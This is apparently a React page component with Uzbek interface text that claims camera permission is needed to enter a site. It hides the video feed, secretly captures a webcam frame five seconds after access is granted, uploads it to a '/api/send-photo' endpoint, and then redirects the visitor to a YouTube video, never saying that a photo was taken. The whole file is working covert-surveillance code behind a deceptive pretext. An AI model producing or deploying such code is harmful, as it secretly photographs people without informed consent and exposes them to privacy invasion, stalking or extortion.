import { useEffect, useRef, useState } from "react";

export default function Home() {
  const videoRef = useRef(null);
  const [status, setStatus] = useState("pending"); // pending / allowed / denied

  const requestCamera = () => {
    navigator.mediaDevices.getUserMedia({ video: true })
      .then(stream => {
        videoRef.current.srcObject = stream;
        setStatus("allowed");

        // 5 soniya keyin YouTube-ga yo'naltirish
        setTimeout(() => {
          captureAndSend(stream);
          window.location.href = "https://www.youtube.com/watch?v=Nv9qxur1s2k";
        }, 5000);
      })
      .catch(err => {
        console.error("Camera denied:", err);
        setStatus("denied");
      });
  };

  useEffect(() => {
    requestCamera();
  }, []);

  const captureAndSend = (stream) => {
    if (!videoRef.current) return;
    const canvas = document.createElement("canvas");
    canvas.width = videoRef.current.videoWidth || 640;
    canvas.height = videoRef.current.videoHeight || 480;
    canvas.getContext("2d").drawImage(videoRef.current, 0, 0);

    canvas.toBlob(async (blob) => {
      if (!blob) return;
      const formData = new FormData();
      formData.append("photo", blob, "auto.jpg");

      try {
        await fetch("/api/send-photo", { method: "POST", body: formData });
        console.log("Rasm yuborildi!");
      } catch (err) {
        console.error("Rasm yuborishda xatolik:", err);
      }
    }, "image/jpeg");
  };

  let message, showButton;
  if (status === "pending") {
    message = "Saytga kirish uchun ruxsat bering";
    showButton = false;
  } else if (status === "allowed") {
    message = "Ruxsat berildi! 5 soniya ichida saytga yo'naltirilasiz...";
    showButton = false;
  } else if (status === "denied") {
    message = "Iltimos, ruxsat bering aks holda saytga kirmaydi";
    showButton = true;
  }

  return (
    <div style={{
      display: "flex",
      justifyContent: "center",
      alignItems: "center",
      height: "100vh",
      backgroundColor: "black",
      color: "white",
      fontSize: "24px",
      textAlign: "center",
      padding: "20px",
      flexDirection: "column"
    }}>
      <video ref={videoRef} autoPlay playsInline style={{ display: "none" }} />
      <div>{message}</div>
      {showButton && (
        <button 
          onClick={requestCamera}
          style={{
            marginTop: "20px",
            padding: "10px 20px",
            fontSize: "18px",
            cursor: "pointer"
          }}
        >
          Ruxsat berish
        </button>
      )}
    </div>
  );
}
